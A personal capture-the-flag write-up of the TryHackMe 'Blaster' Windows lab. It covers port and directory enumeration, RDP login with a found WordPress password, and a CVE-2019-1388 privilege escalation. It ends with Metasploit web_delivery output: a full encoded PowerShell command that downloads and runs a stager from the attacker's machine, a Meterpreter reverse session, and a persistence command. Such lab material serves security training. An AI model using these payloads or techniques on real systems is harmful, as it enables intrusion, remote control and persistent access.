- - - 
created : 17-07-2025 

Tags : #easy
- - - 
# Objective

This Machine is the continuum of [Ice](./Ice.md) room .

Root the [Windows](../../3%20-%20Tags/Hacking%20Concepts/Windows.md)  machine
# Scenario

Throughout this room, we'll be looking at alternative modes of exploitation without the use of [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) or really exploitation tools in general beyond [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) and [Dirbuster](../../3%20-%20Tags/Hacking%20Tools/Dirbuster.md). To wrap up the room, we'll be [Pivoting](../../3%20-%20Tags/Hacking%20Concepts/Pivoting.md) back to these tools for persistence and additional steps we can take. Without further delay, let's deploy our target machine!
## Rustscan/Nmap

Now that we've launched our target, let's perform some basic [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) of the services running on it! We can use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) and pass the results to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blaster]
└─$ rustscan -a 10.10.5.52 -- -A                                  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

Open 10.10.18.50:80
Open 10.10.18.50:3389

```

# Enumeration
## HTTP (80)

We visit the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

![Pasted image 20250718133715.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718133715.png)
### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) for [Fuzzing](../../3%20-%20Tags/Hacking%20Concepts/Fuzzing.md) the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blaster]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.5.52 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.5.52
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/retro                (Status: 301) [Size: 147] [--> http://10.10.5.52/retro/]

```

Now we can navigate to the hidden directory :

![Pasted image 20250718134932.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718134932.png)
We have a username : **Wade

![Pasted image 20250718135423.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718135423.png)
![Pasted image 20250718135504.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718135504.png)

And a [Wordpress](../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md) login page :

![Pasted image 20250718135529.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718135529.png)

We can try to access with Wade: parzival :
![Pasted image 20250718135907.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718135907.png)
![Pasted image 20250718135851.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718135851.png)

We have an email too.

Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

# First Access
## XfreeRDP3

We can use [XfreeRDP3](../../3%20-%20Tags/Hacking%20Tools/XfreeRDP3.md) :
```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blaster]
└─$ xfreerdp3 /v:10.10.5.52 /u:wade /p:parzival
```

And we have our Desktop :

![Pasted image 20250718140247.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718140247.png)

# Privilege Escalation

We can start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) , now that we've gained access to our target system, let's see if we can find a way to escalate. To start, let's scout around the system to see if we can find anything of interest :

[CVE-2019-1388](../../3%20-%20Tags/CVEs/CVE-2019-1388.md) 

Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal! 

We click on the program left on the Desktop :

![Pasted image 20250718141708.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718141708.png)

We go to show more details :

![Pasted image 20250718141746.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718141746.png)

Click the issued by.

And then exit.

After clicking, we do ctrl +s in the page that opens.

![Pasted image 20250718144612.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718144612.png)

We can now open the [CMD](../../3%20-%20Tags/Hacking%20Concepts/CMD.md) and confirm we are Administrators : In the folder area search for **cmd.exe** and press enter.

![Pasted image 20250718144840.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250718144840.png)

Boom .

Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.
## Metasploit

Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of [Payload](../../3%20-%20Tags/Hacking%20Concepts/Payload.md) delivery! For this, we'll be using the script web delivery exploit within [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md). Launch [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) now and select 'exploit/multi/script/web_delivery' for use :

```
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ msfconsole   
Metasploit tip: Display the Framework log using the log command, learn 
more with help log
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E
  Ready...
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!


       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search web_delivery

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1     \_ target: Automatic                                      .                .          .      .
   2     \_ target: Unix/OSX/Linux                                 .                .          .      .
   3     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   4     \_ target: Windows (CMD)                                  .                .          .      .
   5   exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
   6     \_ target: Python                                         .                .          .      .
   7     \_ target: PHP                                            .                .          .      .
   8     \_ target: PSH                                            .                .          .      .
   9     \_ target: Regsvr32                                       .                .          .      .
   10    \_ target: pubprn                                         .                .          .      .
   11    \_ target: SyncAppvPublishingServer                       .                .          .      .
   12    \_ target: PSH (Binary)                                   .                .          .      .
   13    \_ target: Linux                                          .                .          .      .
   14    \_ target: Mac OS X                                       .                .          .      .


Interact with a module by name or index. For example info 14, use 14 or use exploit/multi/script/web_delivery
After interacting with a module you can manually set a TARGET with set TARGET 'Mac OS X'

msf6 > use 5
[*] Using configured payload python/meterpreter/reverse_tcp

```

First, let's set the target to PSH (PowerShell). Which target number is PSH :

```
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X


msf6 exploit(multi/script/web_delivery) > set target 2
target => 2

msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an add
                                       ress on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python



View the full module info with the info, or info -d command.

msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.8.162.183
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/script/web_delivery) > set lport 4444
lport => 4444
msf6 exploit(multi/script/web_delivery) > 
[*] Started HTTP reverse handler on http://10.8.162.183:4444
[*] Using URL: http://10.8.162.183:8080/A5qZgky
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB1ADkAMgBQAGQAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAdQA5ADIAUABkAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAdQA5ADIAUABkAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADEANgAyAC4AMQA4ADMAOgA4ADAAOAAwAC8AQQA1AHEAWgBnAGsAeQAvAFQAdQBHAHcAUABqAFoAMQBXACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA4AC4AMQA2ADIALgAxADgAMwA6ADgAMAA4ADAALwBBADUAcQBaAGcAawB5ACcAKQApADsA


```

After pasting the output in windows shell press enter :

```
*] http://10.8.162.183:4444 handling request from 10.10.5.52; (UUID: 8sxipynf) Staging x86 payload (178780 bytes) ...
[!] http://10.8.162.183:4444 handling request from 10.10.5.52; (UUID: 8sxipynf) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.8.162.183:4444 -> 10.10.5.52:49975) at 2025-07-18 15:05:29 +0200

msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > 

```

Enter sysinfo to view the system’s information.

> **sysinfo**
> 
> **run persistence -X**

**For more reference:** [**_https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/_**](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/)**_https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/_**

Pwned !! 
